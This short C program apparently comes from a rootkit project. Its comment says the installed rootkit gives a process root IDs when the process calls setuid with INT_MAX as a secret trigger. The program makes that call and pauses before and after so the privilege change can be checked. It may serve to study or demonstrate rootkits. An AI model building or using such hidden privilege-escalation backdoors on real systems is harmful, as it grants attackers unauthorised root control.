#define _GNU_SOURCE
#include <limits.h>
#include <stdio.h>
#include <stdlib.h>

/*
 * Example that shows rootkit sets the IDs of process to root if process knows
 * the secret about installed rootkit
 * secret: icall setuid with argument INT_MAX
 */
int main(int argc, char *argv[])
{
	int fd;
	printf("CHECK: Before setting malicious setuid\n");
	printf("Waiting: Enter any number after checking\n");
	scanf("%d", &fd);
	printf("Return value of setuid syscall %d\n", setuid(INT_MAX));
	printf("CHECK: After setting malicious setuid to root\n");
	printf("Waiting: Enter any number after checking\n");
	scanf("%d", &fd);
	exit(EXIT_SUCCESS);
}
